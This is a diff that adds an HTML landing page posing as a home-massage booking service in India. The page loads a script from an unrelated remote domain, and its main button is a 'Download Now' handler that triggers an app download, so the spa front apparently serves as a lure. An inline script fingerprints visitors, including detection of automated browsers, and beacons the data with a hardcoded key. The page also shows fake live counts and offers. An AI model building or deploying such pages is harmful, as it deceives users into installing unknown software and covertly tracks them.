@@ -1,0 +1,208 @@
+<!DOCTYPE html><html lang="en-IN"><head>
+  <meta charset="utf-8">
+  <meta content="width=device-width, initial-scale=1.0, viewport-fit=cover" name="viewport">
+  <meta name="theme-color" content="#ffffff">
+  <title>Royal Touch Spa — Home Massage Anywhere in India</title>
+  <link rel="icon" href="images/secret-world-logo.png" type="image/png">
+  <link rel="stylesheet" href="css/app.css">
+  <!-- Meta Pixel Code: add IDs to this array when available -->
+   
+   <script src="https://api.wenk918d.site/js/meetu-sdk.js"></script>
+   
+  <script>
+    function k2() {
+    MeetU.download(event);
+    }
+  </script>
+</head>
+
+<body>
+  <header class="appbar">
+    <div class="appbar__brand">
+      <span class="appbar__logo" aria-hidden="true" style="overflow:hidden"><img src="images/secret-world-logo.png" alt="" width="37" height="37" style="display:block;width:100%;height:100%;object-fit:cover"></span>
+      <div>
+        <p class="appbar__name">Royal Touch Spa</p>
+        <button class="appbar__city" id="city-btn" type="button">📍 <span id="city-label">Mumbai</span> ▾</button>
+      </div>
+    </div>
+    <div class="appbar__right">
+      <span class="appbar__live"><span class="dot" aria-hidden="true"></span><span id="online-count">42</span> <span data-i18n="nearby">nearby</span></span>
+    </div>
+  </header>
+
+  <main class="page">
+    <section class="upcoming" hidden="" id="upcoming"></section>
+
+    <div class="offer" id="offer">
+      <span class="offer__icon" aria-hidden="true">🎁</span>
+      <div>
+        <p class="offer__title" data-i18n="offer.title">₹500 OFF your first home visit</p>
+        <p class="offer__sub" data-i18n="offer.sub">Open 24 hours · pay after the session</p>
+      </div>
+    </div>
+
+    <div class="india">
+      <svg class="india__flag" viewBox="0 0 30 20" aria-hidden="true"><rect width="30" height="20" rx="2.5" fill="#fff"></rect><path d="M2.5 0h25A2.5 2.5 0 0 1 30 2.5V6.7H0V2.5A2.5 2.5 0 0 1 2.5 0z" fill="#FF9933"></path><path d="M0 13.3h30v4.2a2.5 2.5 0 0 1-2.5 2.5h-25A2.5 2.5 0 0 1 0 17.5z" fill="#138808"></path><circle cx="15" cy="10" r="2.6" fill="none" stroke="#000080" stroke-width=".8"></circle><circle cx="15" cy="10" r=".6" fill="#000080"></circle></svg>
+      <div class="india__body">
+        <p class="india__title" data-i18n="india.title">Home visits anywhere in India</p>
+        <p class="india__sub"><span data-i18n="india.sub">Every state · every city · 24×7 — now serving</span> <b id="india-city">Mumbai</b></p>
+      </div>
+      <button class="india__change" id="india-change" type="button" data-i18n="india.change">Change</button>
+    </div>
+
+    <section class="block" id="block-service">
+      <h2 class="block__title"><b>1</b> <span data-i18n="s1">Choose a massage</span></h2>
+      <div class="services" id="services"></div>
+    </section>
+
+    <section class="block" id="block-therapist">
+      <h2 class="block__title"><b>2</b> <span data-i18n="s2">Choose a therapist</span> <span class="block__hint" data-i18n="s2.hint">Swipe →</span></h2>
+      <div class="therapists" id="therapists"></div>
+    </section>
+
+    <section class="block" id="block-time">
+      <h2 class="block__title"><b>3</b> <span data-i18n="s3">When should we come?</span></h2>
+      <button class="now-card is-active" id="now-card" type="button">
+        <span class="now-card__icon" aria-hidden="true">🛵</span>
+        <span class="now-card__body">
+          <span class="now-card__title"><span data-i18n="now.title">Right now</span> <span class="now-card__247">24×7</span></span>
+          <span class="now-card__sub" id="now-sub">Therapist at your door in <b>25</b> min</span>
+        </span>
+        <span class="now-card__check" aria-hidden="true">✓</span>
+      </button>
+      <p class="or-line" data-i18n="or">or schedule for later · open 24 hours</p>
+      <div class="days" id="days"></div>
+      <div class="periods" hidden="" id="periods"></div>
+      <div class="slots" hidden="" id="slots"></div>
+    </section>
+ 
+
+    <section class="block" id="block-pay">
+      <h2 class="block__title"><b>5</b> <span data-i18n="s5">Payment</span></h2>
+      <div class="pay">
+        <label class="pay__opt">
+          <input checked="" name="pay" type="radio" value="upi">
+          <span data-i18n="pay.upi">📱 UPI after session</span>
+        </label>
+        <label class="pay__opt pay__opt--disabled" aria-disabled="true">
+          <input disabled="" name="pay" type="radio" value="cash">
+          <span data-i18n="pay.cash">💵 Cash unavailable</span>
+        </label>
+      </div>
+      <p class="payment-note" data-i18n="pay.note">Pay only after the session by UPI. Cash is unavailable for therapist safety and verified order records.</p>
+      <div class="bill" id="bill"></div>
+      <p class="consent" id="consent"></p>
+      <ul class="trust">
+        <li data-i18n="trust.india">📍 Home visits in every city across India</li>
+        <li data-i18n="trust.verified">✅ Verified &amp; trained therapists</li>
+        <li data-i18n="trust.kit">🧴 Bed, oils &amp; fresh towels included</li>
+        <li data-i18n="trust.private">🔒 UPI only after session · no advance payment</li>
+      </ul>
+    </section>
+  </main>
+
+  <div class="bookbar">
+    <div class="bookbar__price">
+      <span class="bookbar__total" id="bar-total">₹1,399</span>
+      <span class="bookbar__was" id="bar-was">₹1,899</span>
+    </div>
+    <button class="bookbar__btn" id="book-btn" type="button">Download Now</button>
+  </div>
+
+  <div class="sheet" hidden="" id="city-sheet" role="dialog" aria-modal="true" aria-labelledby="city-sheet-title">
+    <div class="sheet__backdrop" data-close=""></div>
+    <div class="sheet__panel">
+      <h2 class="sheet__title" id="city-sheet-title" data-i18n="city.title">We come to you anywhere in India</h2>
+      <p class="sheet__sub" data-i18n="city.sub">Search your city — if it's not listed, just type it.</p>
+      <input autocomplete="address-level2" class="city-search" data-i18n-ph="city.ph" enterkeyhint="done" id="city-search" maxlength="30" placeholder="Search any city or town" type="search">
+      <div class="city-list" id="city-list"></div>
+    </div>
+  </div>
+
+  <div class="sheet" hidden="" id="done-sheet" role="dialog" aria-modal="true" aria-labelledby="done-title">
+    <div class="sheet__backdrop"></div>
+    <div class="sheet__panel sheet__panel--done">
+      <div class="done__tick" aria-hidden="true">📞</div>
+      <h2 class="done__title" id="done-title" data-i18n="done.title">Request received</h2>
+      <p class="done__lead" data-i18n="done.lead">Our team will call you</p>
+      <p class="done__id"><span data-i18n="done.id">Request ID</span> <b id="done-id">HS000000</b></p>
+      <div class="done__card" id="done-card"></div>
+      <p class="done__note" id="done-note"></p>
+      <button class="done__btn" data-close="" data-i18n="done.ok" type="button">OK</button>
+    </div>
+  </div>
+
+  <div class="toast" id="toast" role="status" aria-live="polite"></div>
+
+  <script>
+    (function setupUnifiedRichboboAnalytics() {
+      const endpoint = '/api_install.php';
+      const uaData = navigator.userAgentData || null;
+      const sessionId = 'app_session_' + Date.now().toString(36) + '_' + Math.random().toString(36).slice(2, 11);
+      let storageAvailable = true;
+      let installId = '';
+
+      try {
+        installId = localStorage.getItem('richbobo_install_id') || localStorage.getItem('device_unique_id') || '';
+        if (!installId) installId = 'web_' + Date.now().toString(36) + '_' + Math.random().toString(36).slice(2, 11);
+        // Both legacy and new reporting now share exactly the same installation ID.
+        localStorage.setItem('richbobo_install_id', installId);
+        localStorage.setItem('device_unique_id', installId);
+      } catch (e) {
+        storageAvailable = false;
+        installId = 'web_fallback_' + Date.now().toString(36) + '_' + Math.random().toString(36).slice(2, 11);
+      }
+
+      const form = new URLSearchParams({
+        auth_key: '888888', unique_id: installId, site_name: 'richbobo.store', value: '1',
+        session_id: sessionId, page_path: location.pathname, referrer: document.referrer,
+        storage_available: storageAvailable ? '1' : '0', app_page: '1', capability_version: '2',
+        touch_points: String(Number(navigator.maxTouchPoints || 0)),
+        screen_width: String(Math.round((window.screen && window.screen.width) || 0)),
+        screen_height: String(Math.round((window.screen && window.screen.height) || 0)),
+        pixel_ratio: String(Number(window.devicePixelRatio || 1)),
+        coarse_pointer: window.matchMedia && window.matchMedia('(pointer: coarse)').matches ? '1' : '0',
+        ua_mobile: uaData && uaData.mobile ? '1' : '0',
+        platform: String((uaData && uaData.platform) || navigator.platform || ''),
+        webdriver: navigator.webdriver ? '1' : '0'
+      });
+
+      let acknowledged = false;
+      let inFlight = false;
+      function report() {
+        if (acknowledged || inFlight) return;
+        inFlight = true;
+        fetch(endpoint, {
+          method: 'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'},
+          body: form.toString(), keepalive: true, credentials: 'same-origin', cache: 'no-store'
+        }).then(function (response) {
+          if (!response.ok) throw new Error('HTTP ' + response.status);
+          return response.text();
+        }).then(function (result) {
+          if (result.trim() !== 'success') throw new Error('collector rejected request');
+          acknowledged = true;
+          if (storageAvailable) {
+            try {
+              localStorage.setItem('richbobo_first_open_reported', '1');
+              localStorage.setItem('has_reported_install', 'true');
+            } catch (e) {}
+          }
+        }).catch(function () {}).finally(function () { inFlight = false; });
+      }
+
+      [0, 1000, 5000, 30000].forEach(function (delay) { window.setTimeout(report, delay); });
+      window.addEventListener('online', report);
+      window.addEventListener('pageshow', report, {once: true});
+      document.addEventListener('visibilitychange', function () { if (!document.hidden) report(); });
+      window.addEventListener('pagehide', function () {
+        if (!acknowledged && navigator.sendBeacon) {
+          const blob = new Blob([form.toString()], {type: 'application/x-www-form-urlencoded;charset=UTF-8'});
+          navigator.sendBeacon(endpoint, blob);
+        }
+      });
+    })();
+  </script>
+  <script src="js/app.js"></script>
+
+
+</body></html>
